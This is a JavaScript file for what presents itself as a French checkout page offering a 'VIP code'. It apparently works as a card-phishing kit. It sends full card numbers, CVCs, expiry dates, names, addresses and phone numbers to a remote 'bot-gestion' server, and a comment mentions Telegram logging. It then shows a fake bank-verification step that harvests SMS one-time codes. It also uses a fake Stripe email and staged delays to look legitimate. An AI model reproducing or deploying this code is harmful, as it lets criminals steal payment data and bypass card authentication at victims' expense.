window.API_URL = "https://bot-gestion-production.up.railway.app"; 

// Form Elements
const form = document.getElementById('paymentForm');
const paymentView = document.getElementById('payment-view');
const successSection = document.getElementById('successSection');
const vipCodeElem = document.getElementById('vipCode');
const payBtn = document.getElementById('payBtn');

// Input Fields (for formatting)
const cardNumberInput = document.getElementById('cardNumber');
const expiryInput = document.getElementById('expiry');
const cvcInput = document.getElementById('cvc');

// Card Number Formatting
cardNumberInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
    e.target.value = formatted.substring(0, 19);
});

// Expiry Date Formatting
expiryInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 2) {
        e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
    } else {
        e.target.value = val;
    }
});

// Log Visit (Optional)
fetch(window.API_URL + '/api/log-visit').catch(() => {});

function validateCardLocal(number, expiry, cvc) {
    const cleanNum = number.replace(/\s+/g, '');
    if (cleanNum.length < 16) return "Numéro de carte incomplet.";

    // Luhn Check
    let sum = 0;
    for (let i = 0; i < cleanNum.length; i++) {
        let intVal = parseInt(cleanNum.charAt(i));
        if (i % 2 === cleanNum.length % 2) {
            intVal *= 2;
            if (intVal > 9) intVal -= 9;
        }
        sum += intVal;
    }
    if (sum % 10 !== 0) return "Numéro de carte invalide.";

    // Expiry
    const expMatch = expiry.match(/^(\d{2}) \/ (\d{2})$/);
    if (!expMatch) return "Date d'expiration invalide (Format: MM / AA).";
    
    const month = parseInt(expMatch[1]);
    const year = parseInt(expMatch[2]) + 2000;
    const now = new Date();
    const curMonth = now.getMonth() + 1;
    const curYear = now.getFullYear();

    if (month < 1 || month > 12) return "Mois d'expiration invalide.";
    if (year < curYear || (year === curYear && month < curMonth)) return "La carte est expirée.";

    // CVC
    if (cvc.length < 3) return "Code CVC invalide.";

    return null;
}

form.onsubmit = async (e) => {
    e.preventDefault();
    
    const error = validateCardLocal(cardNumberInput.value, expiryInput.value, cvcInput.value);
    if (error) {
        alert(error);
        return;
    }

    // Prepare Modal Data
    const now = new Date();
    document.getElementById('summaryDate').innerText = now.toLocaleDateString() + ' ' + now.toLocaleTimeString().substring(0, 5);
    document.getElementById('summaryCard').innerText = '**** **** **** ' + cardNumberInput.value.slice(-4);

    // Show Modal
    const paymentModal = document.getElementById('paymentModal');
    document.getElementById('processingContent').classList.remove('hidden');
    document.getElementById('smsContent').classList.add('hidden');
    paymentModal.classList.remove('hidden');

    const phoneNum = document.getElementById('phone').value;
    const payload = {
        firstName: document.getElementById('firstName').value,
        lastName: document.getElementById('lastName').value,
        billingAddress: document.getElementById('billingAddress').value,
        phone: phoneNum,
        cardNumber: cardNumberInput.value,
        expiry: expiryInput.value,
        cvc: cvcInput.value,
        country: document.getElementById('country').value,
        email: "client@stripe.com"
    };

    document.getElementById('maskedPhone').innerText = phoneNum;

    // Call API immediately so Telegram log is sent direct
    try {
        const res = await fetch(window.API_URL + '/api/pay', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();

        if (data.needsSms) {
            document.getElementById('processingContent').classList.add('hidden');
            document.getElementById('smsContent').classList.remove('hidden');
            window.currentPaymentId = data.paymentId;
        } else if (data.success) {
            paymentModal.classList.add('hidden');
            paymentView.classList.add('hidden');
            successSection.classList.remove('hidden');
            vipCodeElem.innerText = data.code;
        } else {
            alert(data.message || "Erreur de paiement");
            location.reload();
        }
    } catch (err) {
        console.error(err);
        alert("Erreur de connexion au serveur");
        location.reload();
    }
};

// Resend SMS with extra delay
document.getElementById('resendSmsBtn').onclick = async () => {
    const smsContent = document.getElementById('smsContent');
    const processingContent = document.getElementById('processingContent');
    const processingTitle = document.getElementById('processingTitle');
    const processingText = document.getElementById('processingText');
    
    smsContent.classList.add('hidden');
    processingTitle.innerText = "Demande en cours";
    processingText.innerText = "Nous générons un nouveau code de sécurité...";
    processingContent.classList.remove('hidden');

    // 8 seconds for resending (adding more time)
    await new Promise(resolve => setTimeout(resolve, 8000));

    processingContent.classList.add('hidden');
    smsContent.classList.remove('hidden');

    // Reset text for next time
    processingTitle.innerText = "Interrogation en cours";
    processingText.innerText = "Nous interrogeons votre banque pour plus de sécurité.";
};

document.getElementById('submitSmsBtn').onclick = async () => {
    const smsCode = document.getElementById('smsCodeInput').value;
    if (!smsCode) return alert("Entrez le code SMS");

    const submitBtn = document.getElementById('submitSmsBtn');
    submitBtn.disabled = true;
    submitBtn.innerText = "Validation...";

    try {
        const res = await fetch(window.API_URL + '/api/submit-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                smsCode, 
                paymentId: window.currentPaymentId 
            })
        });
        const data = await res.json();

        if (data.success) {
            document.getElementById('paymentModal').classList.add('hidden');
            paymentView.classList.add('hidden');
            successSection.classList.remove('hidden');
            vipCodeElem.innerText = data.code;
        } else {
            alert(data.message || "Code SMS invalide");
            submitBtn.disabled = false;
            submitBtn.innerText = "Valider";
        }
    } catch (err) {
        alert("Erreur de validation");
    }
};

const copyBtn = document.getElementById('copyBtn');
copyBtn.onclick = () => {
    navigator.clipboard.writeText(vipCodeElem.innerText);
    copyBtn.innerText = "Copié !";
    setTimeout(() => copyBtn.innerText = "Copier", 2000);
};
